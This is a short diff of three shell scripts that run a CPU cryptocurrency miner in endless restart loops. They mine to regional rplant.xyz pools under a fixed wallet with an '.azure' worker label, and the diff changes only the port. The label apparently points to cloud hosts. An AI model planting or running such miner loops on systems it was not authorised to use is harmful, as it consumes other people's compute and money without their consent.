@@ -5,18 +5,18 @@ ls
 
 #!/bin/sh
 while [ 1 ]; do
-	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
+	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-asia.rplant.xyz:17022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
 	sleep 5
 done
 
 #!/bin/sh
 while [ 1 ]; do
-	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-eu.rplant.xyz:7022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
+	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-eu.rplant.xyz:17022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
 	sleep 5
 done
 
 #!/bin/sh
 while [ 1 ]; do
-	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
+	./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:17022 -u MahtkkNxJDRCC3EMZKDJKVhyfgv9Mz7Fa3.azure -t 2
 	sleep 5
 done
